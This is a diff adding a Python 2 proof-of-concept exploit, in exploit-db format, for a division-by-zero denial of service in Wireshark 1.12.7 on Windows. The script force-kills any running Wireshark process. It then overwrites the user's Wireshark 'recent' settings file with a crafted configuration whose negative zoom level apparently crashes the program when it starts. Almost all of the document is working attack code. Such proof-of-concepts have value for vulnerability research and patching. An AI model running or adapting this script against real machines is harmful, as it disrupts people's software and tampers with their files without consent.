@@ -1,0 +1,137 @@
+# Exploit Title: Wireshark 1.12.7 Division by zero DOS PoC
+# Date: 02/09/2015
+# Exploit Author: spyk <spyk[dot]developpeur[at]gmail[dot]com> @SwanBeaujard
+# Vendor Homepage: https://www.wireshark.org/
+# Software Link: https://www.wireshark.org/download.html
+# Version: 1.12.7 
+# Tested on: Windows 7
+# Thanks to my professor @St0rn https://www.exploit-db.com/author/?a=8143
+
+import os
+import subprocess
+import getpass
+
+drive=os.getenv("systemdrive")
+user=getpass.getuser()
+path="%s\\Users\\%s\\AppData\\Roaming\\Wireshark\\recent" %(drive,user)
+ 
+def wiresharkIsPresent():
+ 
+ ps=subprocess.check_output("tasklist")
+ 
+ if "Wireshark.exe" in ps:
+ 
+  return 1
+ 
+ else:
+ 
+  return 0
+ 
+ 
+ 
+def killWireshark():
+ 
+ try:
+ 
+  res=subprocess.check_output("taskkill /F /IM Wireshark.exe /T")
+ 
+  return 1
+ 
+ except:
+ 
+  return 0
+ 
+ 
+ 
+if wiresharkIsPresent():
+ 
+ if killWireshark():
+ 
+  print "Wireshark is killed!"
+ 
+sploit="""
+# Recent settings file for Wireshark 1.12.7.
+#
+# This file is regenerated each time Wireshark is quit
+# and when changing configuration profile.
+# So be careful, if you want to make manual changes here.
+ 
+ 
+# Main Toolbar show (hide).
+# TRUE or FALSE (case-insensitive).
+gui.toolbar_main_show: TRUE
+ 
+# Filter Toolbar show (hide).
+# TRUE or FALSE (case-insensitive).
+gui.filter_toolbar_show: TRUE
+ 
+# Wireless Settings Toolbar show (hide).
+# TRUE or FALSE (case-insensitive).
+gui.wireless_toolbar_show: FALSE
+ 
+# Show (hide) old AirPcap driver warning dialog box.
+# TRUE or FALSE (case-insensitive).
+gui.airpcap_driver_check_show: TRUE
+ 
+# Packet list show (hide).
+# TRUE or FALSE (case-insensitive).
+gui.packet_list_show: TRUE
+ 
+# Tree view show (hide).
+# TRUE or FALSE (case-insensitive).
+gui.tree_view_show: TRUE
+ 
+# Byte view show (hide).
+# TRUE or FALSE (case-insensitive).
+gui.byte_view_show: TRUE
+ 
+# Statusbar show (hide).
+# TRUE or FALSE (case-insensitive).
+gui.statusbar_show: TRUE
+ 
+# Packet list colorize (hide).
+# TRUE or FALSE (case-insensitive).
+gui.packet_list_colorize: TRUE
+ 
+# Timestamp display format.
+# One of: RELATIVE, ABSOLUTE, ABSOLUTE_WITH_DATE, DELTA, DELTA_DIS, EPOCH, UTC, UTC_WITH_DATE
+gui.time_format: RELATIVE
+ 
+# Timestamp display precision.
+# One of: AUTO, SEC, DSEC, CSEC, MSEC, USEC, NSEC
+gui.time_precision: AUTO
+ 
+# Seconds display format.
+# One of: SECONDS, HOUR_MIN_SEC
+gui.seconds_format: SECONDS
+ 
+# Zoom level.
+# A decimal number.
+gui.zoom_level: -10
+ 
+# Bytes view.
+# A decimal number.
+gui.bytes_view: 0
+ 
+# Main window upper (or leftmost) pane size.
+# Decimal number.
+gui.geometry_main_upper_pane: 440
+ 
+# Main window middle pane size.
+# Decimal number.
+gui.geometry_main_lower_pane: 428
+ 
+# Packet list column pixel widths.
+# Each pair of strings consists of a column format and its pixel width.
+column.width: %m, 59, %t, 84, %s, 154, %d, 154, %p, 56, %L, 48, %i, 1285
+ 
+ # Last directory navigated to in File Open dialog.
+gui.fileopen_remembered_dir: """+drive+"""\\Users\\"""+user+"""\\Documents\\
+"""
+try:
+	f=open(path,"w")
+	f.write(sploit)
+	f.close()
+	print "Success!"
+except:
+	print "Fail :("
